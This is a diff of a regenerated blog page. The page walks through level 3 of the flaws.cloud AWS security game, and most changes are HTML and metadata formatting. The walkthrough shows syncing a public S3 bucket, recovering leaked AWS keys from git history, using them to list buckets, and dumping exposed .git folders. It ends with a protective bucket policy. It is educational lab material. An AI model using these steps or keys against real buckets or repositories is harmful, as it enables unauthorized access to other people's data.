@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.64.1" />
+    <meta name="generator" content="Hugo 0.101.0" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>flaws.cloud - Level 3 | text/plain</title>
@@ -29,10 +29,10 @@ Like before we have a public homepage hosted on S3. This time we find a git repo
 IAM credentials in the commit history. Using them we can list the buckets and
 find the link to the next level." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://dominicbreuker.com/post/flaws_cloud_3/" />
-<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/>
-<meta property="article:published_time" content="2019-10-27T00:00:00+02:00" />
-<meta property="article:modified_time" content="2019-10-27T00:00:00+02:00" />
+<meta property="og:url" content="https://dominicbreuker.com/post/flaws_cloud_3/" /><meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2019-10-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-10-27T00:00:00+00:00" />
+
 
     
 
@@ -43,6 +43,7 @@ find the link to the next level." />
 
     <meta name="theme-color" content="#000">
 
+    
     
     
     
@@ -217,7 +218,7 @@ figure a:hover {
     
       <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
     
-      <a itemprop="url" class="active" href="/post/"><span itemprop="name">Post</span></a>
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
     
       <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
     
@@ -233,14 +234,9 @@ game teaching you about cloud-specific vulnerabilities related to bad
 configurations. Now I took it up again and here is a walkthrough of level 3.
 Like before we have a public homepage hosted on S3. This time we find a git repository with
 IAM credentials in the commit history. Using them we can list the buckets and
-find the link to the next level.">
-<meta itemprop="datePublished" content="2019-10-27T00:00:00&#43;02:00" />
-<meta itemprop="dateModified" content="2019-10-27T00:00:00&#43;02:00" />
-<meta itemprop="wordCount" content="1868">
-<meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
-
-
-
+find the link to the next level."><meta itemprop="datePublished" content="2019-10-27T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2019-10-27T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1868"><meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 <meta itemprop="keywords" content="infosec,cloud,AWS," />
     <script async src="/js/baffle.js"></script>
     <header>
@@ -255,7 +251,7 @@ find the link to the next level.">
   <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
 </svg>
 
-  Published: <time datetime="2019-10-27T00:00:00&#43;02:00">27 Oct, 2019</time>
+  Published: <time datetime="2019-10-27T00:00:00&#43;00:00">27 Oct, 2019</time>
 
 
       </p>
@@ -309,37 +305,37 @@ own AWS account for this level.</p>
 <p>The description of this level says it is fairly similar to the previous one.
 Thus, we just try again to list the bucket with our dummy user and see what we
 get. The following call will do the trick:</p>
-<pre><code> $ aws s3api list-objects-v2 --bucket level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --no-sign-request --region us-west-2
+<pre tabindex="0"><code> $ aws s3api list-objects-v2 --bucket level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --no-sign-request --region us-west-2
 {
-    &quot;Contents&quot;: [
+    &#34;Contents&#34;: [
         {
-            &quot;Key&quot;: &quot;.git/COMMIT_EDITMSG&quot;,
-            &quot;LastModified&quot;: &quot;2017-09-17T15:12:24.000Z&quot;,
-            &quot;ETag&quot;: &quot;\&quot;5f8f2cb9c2664a23f08dd8a070ae7427\&quot;&quot;,
-            &quot;Size&quot;: 52,
-            &quot;StorageClass&quot;: &quot;STANDARD&quot;
+            &#34;Key&#34;: &#34;.git/COMMIT_EDITMSG&#34;,
+            &#34;LastModified&#34;: &#34;2017-09-17T15:12:24.000Z&#34;,
+            &#34;ETag&#34;: &#34;\&#34;5f8f2cb9c2664a23f08dd8a070ae7427\&#34;&#34;,
+            &#34;Size&#34;: 52,
+            &#34;StorageClass&#34;: &#34;STANDARD&#34;
         },
         {
-            &quot;Key&quot;: &quot;.git/HEAD&quot;,
-            &quot;LastModified&quot;: &quot;2017-09-17T15:12:24.000Z&quot;,
-            &quot;ETag&quot;: &quot;\&quot;4cf2d64e44205fe628ddd534e1151b58\&quot;&quot;,
-            &quot;Size&quot;: 23,
-            &quot;StorageClass&quot;: &quot;STANDARD&quot;
+            &#34;Key&#34;: &#34;.git/HEAD&#34;,
+            &#34;LastModified&#34;: &#34;2017-09-17T15:12:24.000Z&#34;,
+            &#34;ETag&#34;: &#34;\&#34;4cf2d64e44205fe628ddd534e1151b58\&#34;&#34;,
+            &#34;Size&#34;: 23,
+            &#34;StorageClass&#34;: &#34;STANDARD&#34;
         },
         ...
         {
-            &quot;Key&quot;: &quot;index.html&quot;,
-            &quot;LastModified&quot;: &quot;2017-02-27T02:05:16.000Z&quot;,
-            &quot;ETag&quot;: &quot;\&quot;b2d525a43d0d0f84bcc4a8d2cf092170\&quot;&quot;,
-            &quot;Size&quot;: 1703,
-            &quot;StorageClass&quot;: &quot;STANDARD&quot;
+            &#34;Key&#34;: &#34;index.html&#34;,
+            &#34;LastModified&#34;: &#34;2017-02-27T02:05:16.000Z&#34;,
+            &#34;ETag&#34;: &#34;\&#34;b2d525a43d0d0f84bcc4a8d2cf092170\&#34;&#34;,
+            &#34;Size&#34;: 1703,
+            &#34;StorageClass&#34;: &#34;STANDARD&#34;
         },
         {
-            &quot;Key&quot;: &quot;robots.txt&quot;,
-            &quot;LastModified&quot;: &quot;2017-02-27T00:14:33.000Z&quot;,
-            &quot;ETag&quot;: &quot;\&quot;bbbcde0b15cabd06aace1df82d335978\&quot;&quot;,
-            &quot;Size&quot;: 26,
-            &quot;StorageClass&quot;: &quot;STANDARD&quot;
+            &#34;Key&#34;: &#34;robots.txt&#34;,
+            &#34;LastModified&#34;: &#34;2017-02-27T00:14:33.000Z&#34;,
+            &#34;ETag&#34;: &#34;\&#34;bbbcde0b15cabd06aace1df82d335978\&#34;&#34;,
+            &#34;Size&#34;: 26,
+            &#34;StorageClass&#34;: &#34;STANDARD&#34;
         }
     ]
 }
@@ -351,14 +347,14 @@ homepage itself, but also the git repository used to develop it.</p>
 <p>To explore the repository further, we have to download all the files. A quick
 way to do that is to use the <code>sync</code> command of the AWS CLI tool. The following
 command will download the entire bucket to your current local directory:</p>
-<pre><code> $ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud . --no-sign-request --region us-west-2
+<pre tabindex="0"><code> $ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud . --no-sign-request --region us-west-2
 download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to .git/HEAD
 download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/commit-msg.sample to .git/hooks/commit-msg.sample
 download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to .git/COMMIT_EDITMSG
 ...
 </code></pre><p>The git repository is now available and you can work with it just like any
 developer would. First start by inspecting the files you can see:</p>
-<pre><code> $ ls -la
+<pre tabindex="0"><code> $ ls -la
 total 160
 drwxr-xr-x 3 root root   4096 Oct 24 13:48 .
 drwxrwxrwt 1 root root   4096 Oct 24 13:47 ..
@@ -374,12 +370,12 @@ drwxr-xr-x 6 root root   4096 Oct 24 13:48 .git
 look at, of course). But what did this homepage look like in the past? We can
 find out by exploring the development history with git. Use the git <a href="https://git-scm.com/">command
 line tool</a> to see the history of the latest commits:</p>
-<pre><code> $ git log
+<pre tabindex="0"><code> $ git log
 commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -&gt; master)
 Author: 0xdabbad00 &lt;scott@summitroute.com&gt;
 Date:   Sun Sep 17 09:10:43 2017 -0600
 
-    Oops, accidentally added something I shouldn't have
+    Oops, accidentally added something I shouldn&#39;t have
 
 commit f52ec03b227ea6094b04e43f475fb0126edb5a61
 Author: 0xdabbad00 &lt;scott@summitroute.com&gt;
@@ -390,7 +386,7 @@ Date:   Sun Sep 17 09:10:07 2017 -0600
 spot the very interesting commit message of the 2nd commit. Sounds like there
 is something the creator of the homepage does not want others to see. We can
 compare this commit to the previous one to see what that is:</p>
-<pre><code> $ git diff f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
+<pre tabindex="0"><code> $ git diff f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
 diff --git a/access_keys.txt b/access_keys.txt
 deleted file mode 100644
 index e3ae6dd..0000000
@@ -404,57 +400,57 @@ the repository. A few seconds later, the mistake was spotted and fixed quickly
 by adding a commit to remove them. Unfortunately, git does not forget and
 nothing is ever deleted. What might happen if we exchange our dummy user
 credentials with these and try some requests? First set credentials:</p>
-<pre><code> $ export AWS_ACCESS_KEY_ID=AKIAJ367LIFB4IJST7QA
+<pre tabindex="0"><code> $ export AWS_ACCESS_KEY_ID=AKIAJ367LIFB4IJST7QA
  $ export AWS_SECRET_ACCESS_KEY=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
 </code></pre><p>The level description mentions we may be able to list other buckets, so lets
 do that first:</p>
-<pre><code> $ aws s3api list-buckets
+<pre tabindex="0"><code> $ aws s3api list-buckets
 {
-    &quot;Buckets&quot;: [
+    &#34;Buckets&#34;: [
         {
-            &quot;Name&quot;: &quot;2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud&quot;,
-            &quot;CreationDate&quot;: &quot;2017-02-18T19:41:52.000Z&quot;
+            &#34;Name&#34;: &#34;2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud&#34;,
+            &#34;CreationDate&#34;: &#34;2017-02-18T19:41:52.000Z&#34;
         },
         {
-            &quot;Name&quot;: &quot;config-bucket-975426262029&quot;,
-            &quot;CreationDate&quot;: &quot;2017-05-29T16:34:53.000Z&quot;
+            &#34;Name&#34;: &#34;config-bucket-975426262029&#34;,
+            &#34;CreationDate&#34;: &#34;2017-05-29T16:34:53.000Z&#34;
         },
         {
-            &quot;Name&quot;: &quot;flaws-logs&quot;,
-            &quot;CreationDate&quot;: &quot;2018-07-07T16:09:49.000Z&quot;
+            &#34;Name&#34;: &#34;flaws-logs&#34;,
+            &#34;CreationDate&#34;: &#34;2018-07-07T16:09:49.000Z&#34;
         },
         {
-            &quot;Name&quot;: &quot;flaws.cloud&quot;,
-            &quot;CreationDate&quot;: &quot;2017-02-18T19:40:54.000Z&quot;
+            &#34;Name&#34;: &#34;flaws.cloud&#34;,
+            &#34;CreationDate&#34;: &#34;2017-02-18T19:40:54.000Z&#34;
         },
         {
-            &quot;Name&quot;: &quot;level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud&quot;,
-            &quot;CreationDate&quot;: &quot;2017-02-24T05:15:42.000Z&quot;
+            &#34;Name&#34;: &#34;level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud&#34;,
+            &#34;CreationDate&#34;: &#34;2017-02-24T05:15:42.000Z&#34;
         },
         {
-            &quot;Name&quot;: &quot;level3-9afd3927f195e10225021a578e6f78df.flaws.cloud&quot;,
-            &quot;CreationDate&quot;: &quot;2017-02-26T18:29:03.000Z&quot;
+            &#34;Name&#34;: &#34;level3-9afd3927f195e10225021a578e6f78df.flaws.cloud&#34;,
+            &#34;CreationDate&#34;: &#34;2017-02-26T18:29:03.000Z&#34;
         },
         {
-            &quot;Name&quot;: &quot;level4-1156739cfb264ced6de514971a4bef68.flaws.cloud&quot;,
-            &quot;CreationDate&quot;: &quot;2017-02-26T18:49:31.000Z&quot;
+            &#34;Name&#34;: &#34;level4-1156739cfb264ced6de514971a4bef68.flaws.cloud&#34;,
+            &#34;CreationDate&#34;: &#34;2017-02-26T18:49:31.000Z&#34;
         },
         {
-            &quot;Name&quot;: &quot;level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud&quot;,
-            &quot;CreationDate&quot;: &quot;2017-02-26T19:49:03.000Z&quot;
+            &#34;Name&#34;: &#34;level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud&#34;,
+            &#34;CreationDate&#34;: &#34;2017-02-26T19:49:03.000Z&#34;
         },
         {
-            &quot;Name&quot;: &quot;level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud&quot;,
-            &quot;CreationDate&quot;: &quot;2017-02-26T19:48:40.000Z&quot;
+            &#34;Name&#34;: &#34;level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud&#34;,
+            &#34;CreationDate&#34;: &#34;2017-02-26T19:48:40.000Z&#34;
         },
         {
-            &quot;Name&quot;: &quot;theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud&quot;,
-            &quot;CreationDate&quot;: &quot;2017-02-26T20:07:13.000Z&quot;
+            &#34;Name&#34;: &#34;theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud&#34;,
+            &#34;CreationDate&#34;: &#34;2017-02-26T20:07:13.000Z&#34;
         }
     ],
-    &quot;Owner&quot;: {
-        &quot;DisplayName&quot;: &quot;0xdabbad00&quot;,
-        &quot;ID&quot;: &quot;d70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73&quot;
+    &#34;Owner&#34;: {
+        &#34;DisplayName&#34;: &#34;0xdabbad00&#34;,
+        &#34;ID&#34;: &#34;d70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73&#34;
     }
 }
 </code></pre><p>Great! We can now see all the buckets for levels 1 to 6. We can go to the next
@@ -482,7 +478,7 @@ possible to request content via HTTP. S3 will serve all content in the bucket
 via HTTP, including the git repository. Thus, it is easy to test if a git
 repository is on a web server. In our case, the following curl command will
 reveal that there is a repository:</p>
-<pre><code> $ curl http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD
+<pre tabindex="0"><code> $ curl http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD
 ref: refs/heads/master
 </code></pre><p>&ldquo;.git/HEAD&rdquo; is a file that all git repositories have. Thus you can always just
 request this file. If you get a response you know there is a repository. There
@@ -495,7 +491,7 @@ Their location is not easily predictable.</p>
 the web server does not allow listing files. <a href="https://github.com/internetwache/GitTools">GitTools</a>
 provides a script for this purpose. In our example we can use it to get the
 repository:</p>
-<pre><code> $ ./gitdumper.sh http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/ /tmp/repo
+<pre tabindex="0"><code> $ ./gitdumper.sh http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/ /tmp/repo
 ...
 [*] Destination folder does not exist
 [+] Creating /tmp/repo/.git/
@@ -505,7 +501,7 @@ repository:</p>
 ...
 </code></pre><p>Note that this does not require any IAM credentials at all.
 Now we can the result like before to explore the git history and find the keys.</p>
-<pre><code> $ git diff b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 f52ec03b227ea6094b04e43f475fb0126edb5a61
+<pre tabindex="0"><code> $ git diff b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 f52ec03b227ea6094b04e43f475fb0126edb5a61
 diff --git a/access_keys.txt b/access_keys.txt
 new file mode 100644
 index 0000000..e3ae6dd
@@ -535,14 +531,14 @@ can run automated scanners to find secrets. This is handy both for defenders
 and manual search takes time). For example, you could use <a href="https://github.com/dxa4481/truffleHog">truffleHog</a>.
 To test drive it, just install with <code>pip install truffleHog</code>, then run it on the
 repository we dumped in this level and it finds the key for you:</p>
-<pre><code>truffleHog --regex --entropy=false /tmp/repo/
+<pre tabindex="0"><code>truffleHog --regex --entropy=false /tmp/repo/
 ~~~~~~~~~~~~~~~~~~~~~
 Reason: AWS API Key
 Date: 2017-09-17 15:10:43
 Hash: b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
 Filepath: access_keys.txt
 Branch: origin/master
-Commit: Oops, accidentally added something I shouldn't have
+Commit: Oops, accidentally added something I shouldn&#39;t have
 
 AKIAJ367LIFB4IJST7QA
 ~~~~~~~~~~~~~~~~~~~~~
@@ -564,26 +560,26 @@ would grant public read to the entire bucket with the first statement. It is
 required for public website access (<a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/WebsiteAccessPermissionsReqd.html">AWS docs</a>).
 The second statement then overrides the first and denies access to the &ldquo;.git&rdquo; folder.
 Remember that Deny trumps Allow and is evaluated first.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
-  <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>,
-  <span style="color:#f92672">&#34;Statement&#34;</span>: [
-    {
-      <span style="color:#f92672">&#34;Sid&#34;</span>:<span style="color:#e6db74">&#34;PublicRead&#34;</span>,
-      <span style="color:#f92672">&#34;Effect&#34;</span>:<span style="color:#e6db74">&#34;Allow&#34;</span>,
-      <span style="color:#f92672">&#34;Principal&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
-      <span style="color:#f92672">&#34;Action&#34;</span>:[<span style="color:#e6db74">&#34;s3:GetObject&#34;</span>],
-      <span style="color:#f92672">&#34;Resource&#34;</span>:[<span style="color:#e6db74">&#34;arn:aws:s3:::your-bucket/*&#34;</span>]
-    },
-    {
-      <span style="color:#f92672">&#34;Sid&#34;</span>: <span style="color:#e6db74">&#34;DenyGit&#34;</span>,
-      <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Deny&#34;</span>,
-      <span style="color:#f92672">&#34;Principal&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
-      <span style="color:#f92672">&#34;Action&#34;</span>: <span style="color:#e6db74">&#34;s3:GetObject&#34;</span>,
-      <span style="color:#f92672">&#34;Resource&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:s3:::your-bucket/.git/*&#34;</span>
-    }
-  ]
-}
-</code></pre></div><h1 id="conclusion">Conclusion</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Statement&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Sid&#34;</span>:<span style="color:#e6db74">&#34;PublicRead&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Effect&#34;</span>:<span style="color:#e6db74">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Principal&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Action&#34;</span>:[<span style="color:#e6db74">&#34;s3:GetObject&#34;</span>],
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Resource&#34;</span>:[<span style="color:#e6db74">&#34;arn:aws:s3:::your-bucket/*&#34;</span>]
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Sid&#34;</span>: <span style="color:#e6db74">&#34;DenyGit&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Deny&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Principal&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Action&#34;</span>: <span style="color:#e6db74">&#34;s3:GetObject&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;Resource&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:s3:::your-bucket/.git/*&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="conclusion">Conclusion</h1>
 <p>This level demonstrated that it is dangerous to commit secrets to Git
 repositories as well as to make these repositories available on the website.
 None of this is specific to the cloud or AWS in particular. Still, it is
@@ -607,7 +603,7 @@ block access to .git, just in case a repository with a secret gets deployed</li>
       by <span itemprop="author">Dominic Breuker</span>
     
   
-  <time itemprop="datePublished" datetime="2019-10-27T00:00:00&#43;02:00">
+  <time itemprop="datePublished" datetime="2019-10-27T00:00:00&#43;00:00">
     27 Oct, 2019
   </time>
   
@@ -633,10 +629,10 @@ block access to .git, just in case a repository with a secret gets deployed</li>
         <time datetime="6M">6 minutes</time>
       
         <li><a href="/post/htb_carrier/">Hack The Box Write-up - Carrier</a>
-        <time datetime="25M">25 minutes</time>
+        <time datetime="24M">24 minutes</time>
       
         <li><a href="/post/htb_access/">Hack The Box Write-up - Access</a>
-        <time datetime="11M">11 minutes</time>
+        <time datetime="10M">10 minutes</time>
       
         <li><a href="/post/htb_active/">Hack The Box Write-up - Active</a>
         <time datetime="12M">12 minutes</time>
